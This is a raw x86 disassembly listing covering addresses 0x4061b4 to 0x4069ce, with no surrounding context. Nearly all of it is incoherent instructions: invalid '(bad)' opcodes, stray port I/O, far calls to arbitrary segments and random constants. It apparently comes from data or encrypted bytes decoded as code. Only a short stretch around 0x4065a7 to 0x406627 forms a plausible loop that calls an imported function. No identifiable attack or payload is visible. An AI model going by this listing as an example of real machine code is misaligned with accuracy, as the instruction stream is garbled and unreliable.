  4061b4:	jmp    0x4065a2
  4061b9:	and    bl,al
  4061bb:	ss cmp ch,bh
  4061be:	cmc    
  4061bf:	lock jecxz 0x406145
  4061c2:	sahf   
  4061c3:	rol    ebp,1
  4061c5:	inc    ebx
  4061c6:	push   0x3f7355a6
  4061cb:	jle    0x40624b
  4061cd:	dec    edi
  4061ce:	jns    0x40624e
  4061d0:	jle    0x40618a
  4061d2:	scas   eax,DWORD PTR es:[edi]
  4061d3:	push   cs
  4061d4:	fnstenv [edx]
  4061d6:	dec    ecx
  4061d7:	mov    WORD PTR [edx+0x56],gs
  4061da:	fcom   QWORD PTR [esi+0x2779a168]
  4061e0:	cmp    DWORD PTR [eax-0x39871590],edx
  4061e6:	sub    eax,0x30d622c7
  4061eb:	inc    edx
  4061ec:	push   es
  4061ed:	mov    bh,0xe5
  4061ef:	cld    
  4061f0:	shl    esi,1
  4061f2:	add    al,dh
  4061f4:	and    edx,DWORD PTR [esp+ecx*1-0x11a9a9d4]
  4061fb:	push   0x65da3d6
  406200:	out    dx,al
  406201:	and    eax,0x640d6f2f
  406206:	imul   ebp,DWORD PTR [edi+0x74482c08],0xd2934f88
  406210:	mov    al,ds:0x5c024a7f
  406215:	ret    0xf7b4
  406218:	mov    bl,0xf7
  40621a:	and    BYTE PTR [edx-0x1297e295],bh
  406220:	cmp    BYTE PTR [esi-0x4019b3bb],ch
  406226:	push   0xffffffdf
  406228:	inc    BYTE PTR [ecx+0x19]
  40622b:	push   ds
  40622c:	mov    esi,ds
  40622e:	xchg   ebx,eax
  40622f:	into   
  406230:	cmc    
  406231:	jns    0x40625a
  406233:	popf   
  406234:	call   0x7380:0xcfe842f5
  40623b:	mov    DWORD PTR [edi*4+0x1eb77a43],0xf6b444a6
  406246:	lahf   
  406247:	add    ebx,DWORD PTR [eax-0x28]
  40624a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40624b:	xchg   esi,eax
  40624c:	out    0x9a,al
  40624e:	add    BYTE PTR [ecx+0x4aad105],al
  406254:	cmp    BYTE PTR [esi],dh
  406256:	push   ecx
  406257:	sbb    al,0xdc
  406259:	dec    esp
  40625a:	xor    BYTE PTR [edx+ecx*1+0x4c],bl
  40625e:	addr16 sub al,0x4b
  406261:	pop    ebx
  406262:	inc    ebp
  406263:	rcr    DWORD PTR [eax],0xe
  406266:	dec    eax
  406267:	xor    eax,0xe88853be
  40626c:	mov    esi,0xed806f24
  406271:	mov    BYTE PTR [edx+0x1b647699],ch
  406277:	mov    ebp,eax
  406279:	push   cs
  40627a:	sar    ebp,0x1f
  40627d:	push   esi
  40627e:	pop    ebx
  40627f:	ja     0x4062af
  406281:	mov    bl,0xb1
  406283:	mov    edx,0xb624be0e
  406288:	push   esp
  406289:	push   eax
  40628a:	ret    
  40628b:	add    ch,0xdb
  40628e:	adc    al,0x42
  406290:	ret    0x34b4
  406293:	xor    eax,0xd0b7d0bb
  406298:	lods   al,BYTE PTR ds:[esi]
  406299:	lods   al,BYTE PTR ds:[esi]
  40629a:	push   ss
  40629b:	and    dl,BYTE PTR [ecx+0x4c2f2e30]
  4062a1:	mov    ?,WORD PTR [eax-0x158a32f4]
  4062a7:	push   eax
  4062a8:	add    ecx,DWORD PTR ds:0xf6bc41b4
  4062ae:	jne    0x40630c
  4062b0:	stc    
  4062b1:	aas    
  4062b2:	and    al,0x7c
  4062b4:	xlat   BYTE PTR ds:[ebx]
  4062b5:	cmp    al,0xc5
  4062b7:	sahf   
  4062b8:	sbb    bh,al
  4062ba:	cmp    bh,ah
  4062bc:	or     eax,0xf636d580
  4062c1:	gs mov edx,0x9f208a2b
  4062c7:	push   esp
  4062c8:	xor    al,0x97
  4062ca:	inc    eax
  4062cb:	inc    esp
  4062cc:	call   0xa91d:0xecd64c77
  4062d3:	out    0xf6,al
  4062d5:	xchg   edi,eax
  4062d6:	mov    dl,0x4f
  4062d8:	jg     0x406358
  4062da:	push   ebp
  4062db:	dec    esp
  4062dc:	mov    bh,0xcb
  4062de:	ficomp WORD PTR [esi]
  4062e0:	sub    ah,ah
  4062e2:	out    0x2c,eax
  4062e4:	lock mov ds:0xc20a60e0,eax
  4062ea:	xchg   BYTE PTR [ecx+0x21],bl
  4062ed:	retf   
  4062ee:	dec    ebp
  4062ef:	or     al,0x53
  4062f1:	retf   0x1b5f
  4062f4:	mov    ecx,0x5aba28c0
  4062f9:	pop    edi
  4062fa:	pusha  
  4062fb:	aad    0x7
  4062fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062fe:	sti    
  4062ff:	mov    bh,0x91
  406301:	je     0x406360
  406303:	shr    DWORD PTR [edx],0xdf
  406306:	fisttp WORD PTR [esi]
  406308:	pop    edi
  406309:	xchg   esi,eax
  40630a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40630b:	add    eax,0xaa703c0a
  406310:	sbb    al,0x1b
  406312:	inc    edi
  406313:	dec    BYTE PTR [eax-0x43]
  406316:	push   esp
  406317:	cwde   
  406318:	jl     0x40633f
  40631a:	xchg   edi,eax
  40631b:	jg     0x4062ff
  40631d:	xchg   esi,eax
  40631e:	xor    dh,bh
  406320:	sub    eax,0xc0c530d7
  406325:	scas   al,BYTE PTR es:[edi]
  406326:	shl    DWORD PTR [ebp+0x3f],1
  406329:	(bad)  
  40632a:	mov    cl,0x29
  40632c:	rcl    BYTE PTR [eax+0x2843d10c],cl
  406332:	stc    
  406333:	fwait
  406334:	push   es
  406335:	sub    DWORD PTR [edi+0x32d82dc8],eax
  40633b:	jns    0x4062fc
  40633d:	mov    esi,0x154869a6
  406342:	sbb    al,0xe1
  406344:	rol    BYTE PTR [ebx],0xe5
  406347:	ja     0x406346
  406349:	test   DWORD PTR [esi-0x4e],esi
  40634c:	jne    0x406351
  40634e:	mov    cs,ebx
  406350:	mov    dh,0x3a
  406352:	fwait
  406353:	daa    
  406354:	dec    BYTE PTR [esi-0x12]
  406357:	sti    
  406358:	ss sub al,0xb0
  40635b:	call   DWORD PTR [edi+ebx*8]
  40635e:	test   BYTE PTR [ebp+0x6432ee58],dl
  406364:	mov    ds:0x2dfab3cc,al
  406369:	mov    ebx,0xa887e3a7
  40636e:	call   0x5fd24e7b
  406373:	lahf   
  406374:	shl    DWORD PTR [edi+0x11171502],1
  40637a:	shl    edi,1
  40637c:	mov    bh,dl
  40637e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40637f:	mov    ds:0x8aad4de2,eax
  406384:	push   esp
  406385:	inc    esp
  406386:	shr    dl,0xa4
  406389:	push   esi
  40638a:	out    dx,al
  40638b:	add    DWORD PTR [ebp+0x10],ecx
  40638e:	push   cs
  40638f:	mov    BYTE PTR [edi+0x36a55d7f],bl
  406395:	jnp    0x406405
  406397:	mov    al,0x5a
  406399:	lock into 
  40639b:	into   
  40639c:	ja     0x4063e8
  40639e:	jbe    0xac0dde7b
  4063a4:	or     BYTE PTR [edx],bl
  4063a6:	movd   DWORD PTR [ebx+0x61],mm7
  4063aa:	ja     0x4063d7
  4063ac:	(bad)  
  4063ad:	mov    ebp,DWORD PTR [ecx+ecx*4-0x3d]
  4063b1:	fld    DWORD PTR [esi-0x25]
  4063b4:	(bad)  
  4063b5:	sbb    ecx,DWORD PTR [edx-0x41]
  4063b8:	(bad)  
  4063b9:	sub    ch,BYTE PTR [edi]
  4063bb:	lahf   
  4063bc:	lods   eax,DWORD PTR ds:[esi]
  4063bd:	jns    0x4063f9
  4063bf:	leave  
  4063c0:	lods   al,BYTE PTR ds:[esi]
  4063c1:	das    
  4063c2:	adc    ecx,ebp
  4063c4:	int    0x15
  4063c6:	adc    ebp,DWORD PTR [ecx+ebp*4+0x749b7cc5]
  4063cd:	rol    BYTE PTR [eax+edx*8+0x46bfe0f6],1
  4063d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063d5:	cwde   
  4063d6:	xchg   ebp,eax
  4063d7:	xchg   esi,eax
  4063d8:	jbe    0x40640b
  4063da:	inc    edx
  4063db:	retf   0xbc92
  4063de:	and    BYTE PTR [eax+0x1a],ah
  4063e1:	push   ds
  4063e2:	inc    esi
  4063e3:	fidivr WORD PTR [edi+0x53b15f32]
  4063e9:	test   al,0x14
  4063eb:	xor    ch,BYTE PTR [esi-0x66bf170b]
  4063f1:	sub    ecx,DWORD PTR [esp+0x34]
  4063f5:	lahf   
  4063f6:	or     eax,0x54e9e2d9
  4063fb:	das    
  4063fc:	jae    0x406389
  4063fe:	sbb    DWORD PTR [edx-0x5c],esp
  406401:	shr    bh,1
  406403:	das    
  406404:	adc    BYTE PTR [ebx],0x6f
  406407:	retf   0x6c46
  40640a:	aam    0x43
  40640c:	xor    bh,BYTE PTR [eax]
  40640e:	jmp    0x406428
  406410:	retf   
  406411:	xor    BYTE PTR [esi-0x4692ad34],cl
  406417:	mov    bh,0xde
  406419:	shl    BYTE PTR [edx+0x70d6a9d8],cl
  40641f:	imul   ecx,DWORD PTR [esi],0xfffffff0
  406422:	fdivr  DWORD PTR [edx+0x59]
  406425:	leave  
  406426:	lahf   
  406427:	adc    al,0x2f
  406429:	xchg   edi,eax
  40642a:	mov    DWORD PTR [ebx],0x190e2493
  406430:	xchg   edx,eax
  406431:	and    eax,0x7fb8060b
  406436:	(bad)  [eax]
  406438:	lea    ecx,[edx]
  40643a:	mov    ds:0x663ff066,eax
  40643f:	ror    bh,0x8a
  406442:	sbb    dl,BYTE PTR ds:0x712506b9
  406448:	mov    bl,0xa3
  40644a:	iret   
  40644b:	add    ebx,DWORD PTR [ebx]
  40644d:	sub    BYTE PTR [edx-0xbccceb0],0x5
  406454:	mov    BYTE PTR [eax+eiz*8+0x36],ah
  406458:	xchg   esp,eax
  406459:	scas   al,BYTE PTR es:[edi]
  40645a:	dec    edx
  40645b:	cmp    dl,ch
  40645d:	mov    gs,WORD PTR [edi]
  40645f:	add    BYTE PTR [ecx-0x3a],0xec
  406463:	(bad)  
  406464:	jge    0x40644d
  406466:	fld    DWORD PTR [edx]
  406468:	callw  0xa7c2
  40646c:	dec    esi
  40646d:	pop    ebx
  40646e:	inc    ecx
  40646f:	jecxz  0x406412
  406471:	mov    esi,esi
  406473:	int3   
  406474:	(bad)  
  406475:	pop    esi
  406476:	in     eax,dx
  406477:	imul   edi,DWORD PTR [edx+0x30],0xffffff8b
  40647b:	dec    edx
  40647c:	and    al,0xa7
  40647e:	xchg   ebx,eax
  40647f:	mov    al,ds:0x941a0597
  406484:	jns    0x40643d
  406486:	repnz sbb al,0xce
  406489:	sbb    DWORD PTR [edi+0x4951a830],esp
  40648f:	xor    edi,DWORD PTR [ebx+0x51]
  406492:	icebp  
  406493:	icebp  
  406494:	and    eax,0xc9a9d7ff
  406499:	icebp  
  40649a:	in     al,dx
  40649b:	sar    DWORD PTR [esi],cl
  40649d:	sub    al,0x84
  40649f:	or     eax,DWORD PTR [esi]
  4064a1:	mov    bl,bl
  4064a3:	int    0x3a
  4064a5:	mov    ds:0x5fe0419a,al
  4064aa:	mov    ds:0x5ff46a0e,al
  4064af:	cs (bad) 
  4064b1:	fst    QWORD PTR [ebx-0x55ee9455]
  4064b7:	mov    edx,0x5f76fcf9
  4064bc:	xor    al,0xbe
  4064be:	jg     0x406516
  4064c0:	and    DWORD PTR [edi+ecx*2],edi
  4064c3:	jae    0x4064e1
  4064c5:	or     eax,0x99e778c8
  4064ca:	jne    0x40644d
  4064cc:	inc    edi
  4064cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064ce:	aas    
  4064cf:	ja     0x4064dd
  4064d1:	xchg   DWORD PTR [ecx-0x37f04a06],ebx
  4064d7:	fs lock xchg ebx,eax
  4064da:	sbb    dl,BYTE PTR [ebx+edi*4-0x30]
  4064de:	push   0x5131595f
  4064e3:	push   ds
  4064e4:	in     al,dx
  4064e5:	adc    al,0x56
  4064e7:	jae    0x406541
  4064e9:	push   eax
  4064ea:	lock into 
  4064ec:	(bad)  
  4064ed:	mov    edx,0xa303bca6
  4064f2:	cmp    al,al
  4064f4:	je     0x40653f
  4064f6:	sahf   
  4064f7:	in     eax,dx
  4064f8:	sub    ah,BYTE PTR [ecx]
  4064fa:	and    eax,0x2bc5165f
  4064ff:	stc    
  406500:	imul   esp,DWORD PTR [ecx+edx*4],0xffffff89
  406504:	mov    edi,db2
  406507:	fisttp WORD PTR [ebp-0x315893fa]
  40650d:	push   esp
  40650e:	sbb    bh,ch
  406510:	shl    BYTE PTR [edi+0x7e],1
  406513:	xchg   ebp,eax
  406514:	imul   ebx,DWORD PTR [ebx-0x7],0xe30a798e
  40651b:	fs repnz mov edi,0x81ff5cec
  406522:	out    dx,al
  406523:	out    dx,al
  406524:	loop   0x40650e
  406526:	frstor [edi-0x5be70dbb]
  40652c:	inc    ecx
  40652d:	fstp   TBYTE PTR [edi-0x1c]
  406530:	xchg   esi,eax
  406531:	push   ebx
  406532:	cmp    eax,0x4d3eb275
  406537:	cld    
  406538:	into   
  406539:	xchg   edi,eax
  40653a:	mov    al,ds:0x6dc959a6
  40653f:	cmp    dh,BYTE PTR [edx+0x1e]
  406542:	fistp  QWORD PTR [esi-0x3f]
  406545:	pop    ecx
  406546:	jmp    0xf282:0xfb2b55df
  40654d:	retf   
  40654e:	mov    al,ds:0x4cedaf93
  406553:	add    BYTE PTR [ecx-0x5769cf3a],dh
  406559:	je     0x4065c2
  40655b:	jp     0x4064fe
  40655d:	cmp    ebx,DWORD PTR [edx]
  40655f:	jns    0x4065a5
  406561:	out    dx,al
  406562:	and    DWORD PTR [eax+0x3a],0xce1dae16
  406569:	mov    esi,0x52abe8fd
  40656e:	mov    edx,0x17d9a86a
  406573:	test   al,0x3c
  406575:	sbb    DWORD PTR [edi-0x6d],eax
  406578:	jl     0x4065e6
  40657a:	jne    0x4065d4
  40657c:	or     DWORD PTR [edi],edi
  40657e:	ror    ebx,0xf2
  406581:	sub    al,0x3a
  406583:	pop    es
  406584:	xchg   edi,eax
  406585:	(bad)
  406589:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40658b:	push   esi
  40658c:	retf   0xada8
  40658f:	ficomp WORD PTR [ebx+0x6b]
  406592:	or     edi,DWORD PTR [edi]
  406594:	test   BYTE PTR [edx-0x6e5d47bf],0xfd
  40659b:	jl     0x406606
  40659d:	cli    
  40659e:	scas   eax,DWORD PTR es:[edi]
  40659f:	test   al,0x33
  4065a1:	mov    BYTE PTR [ebp-0x48f023bb],cl
  4065a7:	or     eax,0x4346bb
  4065ac:	and    ecx,DWORD PTR ds:0x4345f3
  4065b2:	mov    DWORD PTR ds:0x4346bb,ecx
  4065b8:	mov    DWORD PTR [ebp-0x28],eax
  4065bb:	adc    DWORD PTR ds:0x4345ff,ecx
  4065c1:	mov    eax,DWORD PTR [ebp+0x8]
  4065c4:	sbb    ecx,DWORD PTR ds:0x43470f
  4065ca:	mov    DWORD PTR [ebp-0x20],eax
  4065cd:	push   ebx
  4065ce:	sub    DWORD PTR ds:0x4345f7,ebx
  4065d4:	lea    eax,[ebp-0x18]
  4065d7:	mov    DWORD PTR [ebp-0x1c],eax
  4065da:	xor    DWORD PTR ds:0x43464f,edx
  4065e0:	mov    eax,DWORD PTR [ebp-0x1c]
  4065e3:	and    DWORD PTR ds:0x4345eb,0x0
  4065ed:	mov    ecx,DWORD PTR ds:0x4345eb
  4065f3:	inc    ecx
  4065f4:	mov    DWORD PTR ds:0x4345eb,ecx
  4065fa:	cmp    DWORD PTR ds:0x4345eb,0x1e
  406601:	jne    0x40661a
  406607:	push   DWORD PTR [ebp-0x14]
  40660a:	push   0x434647
  40660f:	push   0x43491f
  406614:	call   DWORD PTR ds:0x413400
  40661a:	cmp    DWORD PTR ds:0x4345eb,0x1c
  406621:	jb     0x4065ed
  406627:	jmp    0x406a15
  40662c:	call   0x70d95cef
  406631:	mov    al,0x70
  406633:	dec    esi
  406634:	mov    BYTE PTR [ecx],dh
  406636:	push   esi
  406637:	inc    esp
  406638:	test   esi,esp
  40663a:	dec    eax
  40663b:	fisttp WORD PTR [ebx+edi*1+0x7e]
  40663f:	jle    0x406690
  406641:	jns    0x4066c1
  406643:	jle    0x4065e7
  406645:	enter  0xcb03,0x4c
  406649:	cwde   
  40664a:	lods   eax,DWORD PTR ds:[esi]
  40664b:	pop    ebx
  40664c:	scas   al,BYTE PTR es:[edi]
  40664d:	cmc    
  40664e:	inc    eax
  40664f:	(bad)  
  406650:	(bad)  
  406652:	adc    ch,cl
  406654:	scas   eax,DWORD PTR es:[edi]
  406655:	pop    ebp
  406656:	pop    eax
  406657:	fsub   st(6),st
  406659:	in     al,dx
  40665a:	sbb    al,BYTE PTR [eax+0x2801746a]
  406660:	in     al,dx
  406661:	gs fwait
  406663:	popa   
  406664:	daa    
  406665:	add    eax,0x3e794f40
  40666a:	lahf   
  40666b:	aas    
  40666c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40666d:	daa    
  40666e:	xchg   BYTE PTR [ebx-0x2f],ch
  406671:	pop    DWORD PTR [ecx]
  406673:	out    0x8d,eax
  406675:	imul   ebp,DWORD PTR [edx-0x6],0x520dd0c8
  40667c:	call   0x58f795c2
  406681:	adc    DWORD PTR [eax+0x19],esi
  406684:	clc    
  406685:	in     al,dx
  406686:	in     al,0x7f
  406688:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406689:	mov    ecx,fs
  40668b:	cdq    
  40668c:	pop    ecx
  40668d:	out    dx,al
  40668e:	pop    ds
  40668f:	aad    0x0
  406691:	xlat   BYTE PTR ds:[ebx]
  406692:	(bad)  
  406693:	sahf   
  406694:	sbb    dh,BYTE PTR [ebx+0x67]
  406697:	add    eax,0x4e5cb134
  40669c:	ja     0x40669a
  40669e:	dec    eax
  40669f:	shl    ch,cl
  4066a1:	mov    es:0x29d0804f,eax
  4066a7:	loopne 0x4066be
  4066a9:	jnp    0x4066b5
  4066ab:	aam    0xa4
  4066ad:	lea    ebx,[esi+0x322828ec]
  4066b3:	mov    edx,0x3d8427a9
  4066b8:	fadd   DWORD PTR [edi-0x3a]
  4066bb:	cmc    
  4066bc:	push   ebp
  4066bd:	imul   esp,DWORD PTR [ecx+0xd],0x6533354d
  4066c4:	cdq    
  4066c5:	xchg   BYTE PTR ds:0xf82c848c,dh
  4066cb:	out    0x54,eax
  4066cd:	in     eax,dx
  4066ce:	popa   
  4066cf:	mov    ecx,0x76af61a8
  4066d4:	out    dx,eax
  4066d5:	inc    esi
  4066d6:	push   ss
  4066d7:	div    BYTE PTR [eax+edi*8-0x4993a0b]
  4066de:	nop
  4066df:	xor    DWORD PTR [edx+0x37691dc5],esp
  4066e5:	push   0x73
  4066e7:	outs   dx,BYTE PTR ds:[esi]
  4066e8:	mov    BYTE PTR [ebx+0x47],cl
  4066eb:	in     eax,dx
  4066ec:	mov    edi,DWORD PTR [edi-0x10]
  4066ef:	jg     0x40674e
  4066f1:	loopne 0x4066cb
  4066f3:	rol    ebx,1
  4066f5:	gs nop
  4066f7:	jmp    0x8ccf:0xb371fcec
  4066fe:	dec    ebx
  4066ff:	es (bad) 
  406701:	xlat   BYTE PTR ds:[ebx]
  406702:	call   0xc835:0x110eda51
  406709:	add    ch,bh
  40670b:	ins    DWORD PTR es:[edi],dx
  40670c:	pop    edx
  40670d:	inc    ebp
  40670e:	pop    ss
  40670f:	fisttp WORD PTR [edx+edx*8+0xf69b45b]
  406716:	inc    ecx
  406717:	add    eax,0xf55035d7
  40671c:	xchg   esi,eax
  40671d:	push   ebx
  40671e:	test   al,0xce
  406720:	ficom  WORD PTR [edx]
  406722:	mov    ds:0xed30b1ab,al
  406727:	cli    
  406728:	or     ch,al
  40672a:	jle    0x4067a1
  40672c:	fcom   QWORD PTR [esp+edx*4+0x6d905018]
  406733:	push   eax
  406734:	ror    DWORD PTR [edi-0x65],cl
  406737:	mov    ebp,0xc5b69f9f
  40673c:	dec    edx
  40673d:	cmp    al,ch
  40673f:	scas   eax,DWORD PTR es:[edi]
  406740:	pusha  
  406741:	add    esp,ecx
  406743:	fimul  WORD PTR [edx-0x2ea5213a]
  406749:	rcr    BYTE PTR [edi+0x5fd9866e],1
  40674f:	popf   
  406750:	xor    DWORD PTR [ecx-0x6e],0xffffffd1
  406754:	lahf   
  406755:	push   0xd68263e1
  40675a:	lock mov ecx,0x1a982f78
  406760:	ins    DWORD PTR es:[edi],dx
  406761:	and    DWORD PTR [edi-0x2324705f],edi
  406767:	or     bh,ch
  406769:	in     al,dx
  40676a:	push   esp
  40676b:	loopne 0x4066f7
  40676d:	mov    cs,edx
  40676f:	inc    edi
  406770:	cmc    
  406771:	pusha  
  406772:	retf   
  406773:	jno    0x4067ab
  406775:	lods   al,BYTE PTR ds:[esi]
  406776:	cmp    bh,0x7a
  406779:	jle    0x406743
  40677b:	push   ebp
  40677c:	sahf   
  40677d:	sbb    ch,BYTE PTR [esi+0x35]
  406780:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406781:	pop    esi
  406782:	cs imul eax,edi,0xfffffff5
  406786:	out    dx,eax
  406787:	pop    edx
  406789:	shl    DWORD PTR [edx],cl
  40678b:	mov    al,ds:0xd68651ab
  406790:	push   0xfffffff6
  406792:	repz pop ebx
  406794:	cmp    al,0x84
  406796:	xchg   ebx,eax
  406797:	repz mov ch,0x46
  40679a:	inc    eax
  40679b:	js     0x406810
  40679d:	js     0x40679f
  40679f:	test   eax,0x8bd2f8e3
  4067a4:	ret    0xb4b6
  4067a7:	test   BYTE PTR [edi+0x4009f55b],al
  4067ad:	ror    dl,0xd
  4067b0:	enter  0x47e1,0x81
  4067b4:	inc    ebp
  4067b5:	es out 0x2,eax
  4067b8:	jp     0x40682e
  4067ba:	fcomip st,st(7)
  4067bc:	sub    BYTE PTR [edi-0x2cdeedf7],ch
  4067c2:	jnp    0x406749
  4067c4:	pop    es
  4067c5:	(bad)  
  4067c6:	jecxz  0x406843
  4067c8:	jl     0x406840
  4067ca:	or     al,BYTE PTR [edi-0x57ec6cec]
  4067d0:	shr    BYTE PTR [ebp-0x4fe2e41f],1
  4067d6:	jnp    0x40676c
  4067d8:	fs imul edx,eax,0xffffffdf
  4067dc:	push   ecx
  4067dd:	add    al,0x69
  4067df:	adc    al,0xa9
  4067e1:	mov    al,0xe4
  4067e3:	add    al,0x3
  4067e5:	dec    esi
  4067e6:	mov    ss,WORD PTR [ebx-0x53]
  4067e9:	inc    edi
  4067ea:	fild   WORD PTR [edi-0x52]
  4067ed:	out    dx,eax
  4067ee:	xor    esi,ebp
  4067f0:	sahf   
  4067f1:	retf   
  4067f2:	pop    eax
  4067f3:	pop    ecx
  4067f4:	inc    esi
  4067f5:	fmulp  st(4),st
  4067f7:	cmp    eax,0xc9221c9c
  4067fc:	mov    DWORD PTR [ebx],esi
  4067fe:	arpl   WORD PTR [ecx+0x14969bb5],bp
  406804:	(bad)  
  406805:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406806:	rcr    DWORD PTR [esi+0x42],1
  406809:	add    eax,0x426c048a
  40680e:	sahf   
  40680f:	sbb    DWORD PTR [ecx-0x78],ecx
  406812:	mov    esi,0xb2ac4e5b
  406817:	daa    
  406818:	jnp    0x4067b6
  40681a:	xchg   ecx,eax
  40681b:	idiv   BYTE PTR [edi]
  40681d:	js     0x406852
  40681f:	sbb    bh,BYTE PTR [esi+0x2a]
  406822:	test   DWORD PTR [esi+0x11e9f91f],0x9ebca2aa
  40682c:	or     al,0x97
  40682e:	dec    eax
  40682f:	in     al,0x12
  406831:	repnz xor cl,BYTE PTR [edi]
  406834:	repnz xchg esi,eax
  406836:	lods   eax,DWORD PTR ds:[esi]
  406837:	ds pop ds
  406839:	cli    
  40683a:	rcl    BYTE PTR [ecx+0x76bedb09],cl
  406840:	sbb    DWORD PTR [edx+0x7e],0xfea9798b
  406847:	jg     0x406818
  406849:	je     0x406822
  40684b:	cmp    ah,ah
  40684d:	test   eax,0x52602d4
  406852:	daa    
  406853:	bnd jne 0x40680a
  406856:	das    
  406857:	add    BYTE PTR [ecx-0x26],0x99
  40685b:	cli    
  40685c:	pop    ds
  40685d:	xchg   esi,eax
  40685e:	push   ds
  40685f:	stos   BYTE PTR es:[edi],al
  406860:	retf   
  406861:	xor    DWORD PTR [ebx-0x48aa57be],0xffffffe1
  406868:	out    0xad,al
  40686a:	int    0x4a
  40686c:	xchg   ebx,eax
  40686d:	call   0xe6ee94e3
  406872:	or     eax,esi
  406874:	dec    ebx
  406875:	pop    es
  406876:	jg     0x406879
  406878:	icebp  
  406879:	mov    cl,0xf8
  40687b:	xchg   DWORD PTR ds:0xc9d0226e,edi
  406881:	stc    
  406882:	dec    ebp
  406883:	clc    
  406884:	repz jle 0x406905
  406887:	push   eax
  406888:	adc    DWORD PTR [edx+eiz*2],esi
  40688b:	sub    BYTE PTR [eax+0x44],ah
  40688e:	divps  xmm5,XMMWORD PTR [ecx-0x287f5f5f]
  406895:	jae    0x40681b
  406897:	aaa    
  406898:	mov    ebx,0xe81fd790
  40689d:	or     DWORD PTR [edi+0x6abb6fc1],esi
  4068a3:	pop    edi
  4068a4:	dec    edi
  4068a5:	xchg   ebx,eax
  4068a6:	jg     0x406870
  4068a8:	add    al,0xe4
  4068aa:	andnps xmm1,XMMWORD PTR [eax+0x21]
  4068ae:	push   edi
  4068af:	outs   dx,DWORD PTR ds:[esi]
  4068b0:	sbb    BYTE PTR [edx],al
  4068b2:	test   ebx,0x60b25fd9
  4068b8:	push   cs
  4068b9:	and    dh,BYTE PTR [eax+0x51]
  4068bc:	test   esp,edx
  4068be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068bf:	xor    ebx,DWORD PTR [edx+eiz*2-0x2]
  4068c3:	out    0x5,eax
  4068c5:	jecxz  0x4068c1
  4068c7:	pop    ecx
  4068c8:	jg     0x40686c
  4068ca:	pop    ss
  4068cb:	lods   eax,DWORD PTR ds:[esi]
  4068cc:	mov    ebp,0x379baa4a
  4068d1:	mov    esi,0x1f09c766
  4068d6:	ret    
  4068d7:	call   0x6aa4:0xc50cef42
  4068de:	icebp  
  4068df:	sbb    eax,0x42b08be4
  4068e4:	jmp    0xe375:0xa71fbdbd
  4068eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068ec:	aas    
  4068ed:	mov    ch,0x36
  4068ef:	mov    ah,0xf2
  4068f1:	xchg   ebp,eax
  4068f2:	dec    ebx
  4068f3:	das    
  4068f4:	mov    cl,ah
  4068f6:	iret   
  4068f7:	mov    ch,0xfe
  4068f9:	out    0x79,eax
  4068fb:	jno    0x406942
  4068fd:	xchg   edi,eax
  4068fe:	pop    edi
  4068ff:	dec    esi
  406900:	push   edi
  406901:	js     0x4068e8
  406903:	jl     0x40696c
  406905:	sbb    al,0xa1
  406907:	test   eax,0x85a14ca0
  40690c:	ja     0x406906
  40690e:	(bad)  
  406910:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406911:	add    BYTE PTR [edi-0x6294a974],bl
  406917:	mov    al,ds:0xf4f8d86c
  40691c:	jle    0x406978
  40691e:	push   ecx
  40691f:	dec    eax
  406920:	or     esp,DWORD PTR [edx+ebx*2+0x4c6181db]
  406927:	ins    DWORD PTR es:[edi],dx
  406928:	popa   
  406929:	mov    bl,0x51
  40692b:	cdq    
  40692c:	adc    ecx,DWORD PTR [esi-0x529c551d]
  406932:	imul   ebx,DWORD PTR [ecx-0x105ff8bb],0x39855143
  40693c:	mov    esi,0x8d7fdf1d
  406941:	sub    eax,0xedf8b57
  406946:	(bad)  
  406947:	ss jecxz 0x406987
  40694a:	push   0x69
  40694c:	rcl    DWORD PTR [ebx],0xd
  40694f:	inc    DWORD PTR [edi+edx*8]
  406952:	add    BYTE PTR [ebp-0x30],dh
  406955:	aas    
  406956:	jp     0x406974
  406958:	xor    dl,BYTE PTR [edx-0x32]
  40695b:	out    0xa8,al
  40695d:	add    al,0xbd
  40695f:	or     bh,bh
  406961:	sbb    ah,BYTE PTR [ebx]
  406963:	fild   DWORD PTR [ecx+0x74]
  406966:	loop   0x4069dc
  406968:	dec    ebp
  406969:	ins    BYTE PTR es:[edi],dx
  40696a:	rcr    DWORD PTR [edx-0x7b],1
  40696d:	pusha  
  40696e:	pop    edi
  40696f:	push   es
  406970:	loop   0x4069e2
  406972:	arpl   WORD PTR [edx],dx
  406974:	pop    ds
  406975:	in     eax,dx
  406976:	(bad)  
  406977:	fild   QWORD PTR [ecx+0x1f]
  40697a:	xchg   edx,eax
  40697b:	mov    ds:0x7ad51d6,al
  406980:	xor    ebp,esi
  406982:	sub    eax,0xf17d2083
  406987:	fwait
  406988:	mov    ebx,0x80e7870d
  40698d:	out    dx,al
  40698e:	out    0x4f,eax
  406990:	ret    
  406991:	xchg   ebp,eax
  406992:	lea    ebp,[edx-0x46]
  406995:	xchg   ebx,eax
  406996:	sub    DWORD PTR [edi-0xa25a9ca],0x57
  40699d:	enter  0x69c1,0x67
  4069a1:	mov    cs,WORD PTR [ecx-0x69]
  4069a4:	sub    ah,BYTE PTR [eax]
  4069a6:	inc    esp
  4069a7:	jp     0x406938
  4069a9:	inc    edx
  4069aa:	mov    dh,0x7a
  4069ac:	and    edx,DWORD PTR [ecx+0x76]
  4069af:	imul   edx,ebx,0xffffffaa
  4069b2:	cmp    eax,DWORD PTR [ebx-0x7cff9501]
  4069b8:	shr    DWORD PTR [edi-0x41],0x59
  4069bc:	mov    al,0xb9
  4069be:	sub    eax,0x43c8570c
  4069c3:	popf   
  4069c4:	cmp    BYTE PTR [ebx-0x27],ah
  4069c7:	mov    edx,0x57920a7d
  4069cc:	adc    BYTE PTR [ecx],bl
  4069ce:	outs   dx,BYTE PTR ds:[esi]
